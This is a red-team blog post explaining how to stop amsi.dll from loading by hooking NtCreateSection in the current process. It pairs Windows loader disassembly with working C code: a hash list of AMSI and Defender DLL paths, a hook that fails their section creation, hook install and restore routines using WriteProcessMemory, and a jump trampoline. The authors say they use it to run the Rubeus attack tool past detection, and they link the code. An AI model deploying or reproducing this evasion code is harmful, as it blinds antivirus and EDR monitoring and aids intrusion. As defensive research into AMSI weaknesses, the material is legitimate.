---
title: "[Malware] Bypass AMSI in local process hooking NtCreateSection"
header:
  teaser: "https://farm5.staticflickr.com/4076/4940499208_b79b77fb0a_z.jpg"
categories: 
  - ES
tags:
  - ES
  - Red Team
  - Malware
  - Hooking
  - Research
author: Alejandro Pinna
---

Hi to all! Here suffering (again) the high temperatures and hoping winter to come back again ;-).
Today we will talk about an AMSI bypass technique (probably not too useful in engagements) but interesting anyway.
A lot of AMSI bypass techniques have been published since Microsoft presented it for Windows 10 / Server 2016 but it's also interesting to see a new one.

## AMSI internals

When a new powershell / VBA / C# based process is created, the operating system will inject into the process an AMSI DLL, this DLL will scan the process to look for malicious statical content, and in case something is detected, it will trigger an alert to the antivirus software.

The execution flow can be observed graphically in the following screenshot.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_07-17_amsi/amsi_flow.png)

It's interesting to note that a lot of EDRs use AMSI to detect scripts malicious activity, and subscribe to the ETW session provided by AMSI.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_07-17_amsi/edr_subscribed.png)

So it's not only about bypassing Windows Defender detections, but in some engagements we can find AMSI being used by EDR software.

In the case of this bypass, we won´t use any patching technique, instead, we will abuse some windows internals behaviours to avoid the DLL being loaded in a process at all.

## The bypass itself

First of all, let's see some theory about how windows loader works.
In this case we won´t talk about process creation, because our bypass resides not in the creation itself, but in the DLL loading procedure.
Let's imagine we have an already created process in the system, and it's not a C# process, then, it won´t have a copy of AMSI.dll loaded in the process, if during the execution time of that process, we inject a C# shellcode, then all the DLLs needed by that shellcode will be loaded and also the AMSI dll will be loaded.

The procedure used to load a Dll in Windows resides in NTDLL, and is in the following function **_LdrpMapDllNtFileName**, the execution flow of that function can be seen decompiled following.

```c
loc_6A22D43A:           ; OpenOptions
push    60h ; '`'
push    5               ; ShareAccess
lea     eax, [ebp+IoStatusBlock]
push    eax             ; IoStatusBlock
lea     eax, [ebp+ObjectAttributes]
push    eax             ; ObjectAttributes
push    100021h         ; DesiredAccess
lea     eax, [ebp+FileHandle]
push    eax             ; FileHandle
call    _NtOpenFile@24  ; NtOpenFile(x,x,x,x,x,x)
mov     esi, eax
test    esi, esi
js      loc_6A2AA298
```

First of all, the loader will open a handle to a the DLL file (except the DLL that is going to be mapped resides in \KnownDLLs)

```c
loc_6A22D478:
push    [ebp+FileHandle]
lea     eax, [ebp+Handle]
push    1000000h
push    10h
push    0
push    0
push    0Dh
push    eax
call    _NtCreateSection@28 ; NtCreateSection(x,x,x,x,x,x,x)
mov     esi, eax
test    esi, esi
js      loc_6A2AA317
```

With this file handle, the function will check integrity related things, etc and later will call NtCreateSection, returning the created section in **[ebp+Handle]**

Finally, if we follow the function, we see a call to **_LdrpMapDllWithSectionHandle** that receives a handle as input value, this function will call **LdrpMinimalMapModule** and in that function we will see a call to **ZtMapViewOfSection**.

```c
loc_6A22E621:
neg     eax
lea     ecx, [esi+18h]
mov     [ebp+var_18], ecx
sbb     eax, eax
and     eax, 0FFFFFF82h
sub     eax, 0FFFFFF80h
push    eax
push    ebx
push    1
push    edx
xor     eax, eax
push    eax
push    eax
push    eax
push    ecx
push    0FFFFFFFFh
push    [ebp+var_10]
call    _ZwMapViewOfSection@40 ; ZwMapViewOfSection(x,x,x,x,x,x,x,x,x,x)
mov     ecx, [ebp+var_14]
mov     esi, eax
mov     eax, [ebp+var_8]
mov     [eax+14h], ecx
cmp     ebx, 20000000h
jz      loc_6A2AA836
```

ZwMapViewOfSection will map the AMSI DLL in the process.

If we could anyway break any of those functions when AMSI DLL is going to be loaded, then the DLL would not be loaded, and our process would live AMSI free.

## Offensive Hooking

The hooking technique comes fast to our mind, normally this technique is used by security products to monitor what a userland process is calling (NTDLL syscall hooking), but nothing prevents us from hooking our process (or others if you can get a PROCESS_VM_WRITE handle).

Via hooking we could intercept calls to NtOpenFile / NtCreateSection / NtMapViewOfSection (any of them) and when we see the AMSI dll is going to be loaded return an invalid handle, so the loader will not be able to load it.

In this case we choosed NtCreateSection, not because a special reason, but because we already have implemented it for other implants, and we can reutilize the code (be lazy) ;-).

The hooked function would look like this.

```c

std::string data_hash2[] =
{
	"fbd13447dcd3ab91bb0d2324e11eca986967c99dcd324b00f9577010c6080413", //SHA256 of the UNC Path of the AMSI dll and other Windows Defender injected DLLs
	"856efe1b2c5b5716b4d373bb7205e742da90d51256371c582ce82b353d900186",
	"d8d52609d0c81d70bf44cb3cd5732a1c232cc20c25342d0a118192e652a12d98",
	"a75589e0d1b5b8f0ad28f508ed28df1b4406374ac489121c895170475fe3ef74"

	
}; //array with the file hashes



NTSTATUS ntCreateMySection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL) /*Bypass AMSI*/
{
	int isFinal = 0;
	char lpFilename[256];
	if (FileHandle != NULL)
	{

		DWORD res = GetFinalPathNameByHandleA(FileHandle, lpFilename, 256, FILE_NAME_OPENED | VOLUME_NAME_DOS); //Get the file path of the file handle
		if (res == 0)
			printf("GetFinalPathNameByHandleA error: %d\n", GetLastError());

		else
		{
			std::string hash = sha256(std::string(lpFilename)); //Compute the SHA256 hash of the file path (only the hash of the name, not the file)
			unsigned int arrSize = sizeof(data_hash2) / sizeof(data_hash[0]); //Get the size of the array
			for (int counter = 0; counter < arrSize; counter++) //Loop each position of the array
			{
				if (hash.compare(data_hash2[counter]) == 0) //If hash of the DLL to load is equal to any of the array hashes return 0
				{
					return -1;
				}
			}
		}
	}
	restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle); //If it's not an AMSI DLL restore the original NtCreateSection
	return 1;
}

```

1. At the beggining of the code we see an array containing a list of hashes of DLLs that are usually used to monitor malicious activity.
2. Later we see the hooked NtCreateSection function, that will check which is the path belonging to the File Handle parameter (**GetFinalPathNameByHandleA**).
3. In case the file hash is one of the hashes existing in the hash array, the hooked function will return -1 (in the NTSTATUS world we see that as an error, because an NTSTATUS success value is 0)
4. In case the file hash is not in the array, then we will jump to the real NtCreateSection, and we will allow the process to map DLLs.

Following we can see how whe NtCreateSection returns an error, the loader will return without loading the DLL.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_07-17_amsi/jump_if_error.png)

In this case we may be careful, because if we return 0x0C000047E then, the function **_LdrAppxHandleIntegrityFailure** would be called, and this function would terminate our process (in no way my mind could think about using that value as return, but disclaimer is important...) 

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_07-17_amsi/terminate_process.png)

For those cases when the hook function is not returning an AMSI dll, we must restore the previous NtCreateSection, which is done via the following snippet.

```c
BOOL restore_hook_ntcreatesection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL)
{
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId()); //Open current process
	myNtCreateSection NtCreate;
	NtCreate = (myNtCreateSection)GetProcAddress(GetModuleHandle(L"NTDLL.dll"), "NtCreateSection"); //Get address of the hooked NtCreateSection
	DWORD written2, written3;


	VirtualProtect(NtCreate, sizeof NtCreate, PAGE_EXECUTE_READWRITE, &written2); //Protect it 
	VirtualProtect(tramp_old_ntcreatesection, sizeof tramp_old_ntcreatesection, PAGE_EXECUTE_READWRITE, &written3);

	if (!WriteProcessMemory(hProc, NtCreate, &tramp_old_ntcreatesection, sizeof tramp_old_ntcreatesection, NULL)) //Write the real NtCreateSection in the address of the hook
	{
		return FALSE;
	}
	NtCreate(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle); //Call the real NtCreateSection
	hook_ntcreatesection(hProc); //hook it again
	return 1;

}
```

And the function in charge of installing the hook.

```c
BOOL hook_ntcreatesection(HANDLE hProc)
{
	myNtCreateSection NtCreate;
	NtCreate = (myNtCreateSection)GetProcAddress(GetModuleHandle(L"NTDLL.dll"), "NtCreateSection"); //GetProcAddress of NtCreateSection
	if (!NtCreate)
		exit(-1);
	DWORD written3;


	VirtualProtect(NtCreate, sizeof NtCreate, PAGE_EXECUTE_READWRITE, &written3); //Protect it 

	void* reference = (void*)ntCreateMySection; //pointer to ntCreateSection  (hook) in reference


	memcpy(tramp_old_ntcreatesection, NtCreate, sizeof tramp_old_ntcreatesection); //Copy the syscall of NtCreateSection (real) in a global variable
	memcpy(&tramp_ntcreatesection[2], &reference, sizeof shit3); //Copy  the hook to tramp_ntcreatesection

	DWORD old3;

	VirtualProtect(tramp2, sizeof tramp_ntcreatesection, PAGE_EXECUTE_READWRITE, &old3);


	if (!WriteProcessMemory(hProc, (LPVOID*)NtCreate, &tramp_ntcreatesection, sizeof tramp_ntcreatesection, NULL)) //Write the hook to the address of the NtCreateSection
	{
		return -1;
	}
	return 1;
}
```

And finally, the trampoline, where we used the one that friends of <https://adepts.of0x.cc/hookson-hootoff/> used for this fantastic post (thank you mates!!)

```c
char tramp_ntcreatesection[13] = {
	0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
	0x41, 0xFF, 0xE2                                                    // jmp r10
};
char tramp_old_ntcreatesection[13];
```






## Conclusion

Even this bypass is not very useful to execute powershell scripts (although could be implement with effort and suffering), it could be used when you want for example to execute Rubeus and AMSI is detecting the tool usage (we use it for that).

For example we can see here how we are using it to execute rubeus, and we pass the commands to that via Named Pipe.



![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_07-17_amsi/rubeus.png)

And we see how amsi.dll is not loaded in the process.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/2022_07-17_amsi/amsi_bypass_x64.png)


Code is published here:

<https://github.com/waawaa/AMSI_Rubeus_bypass>





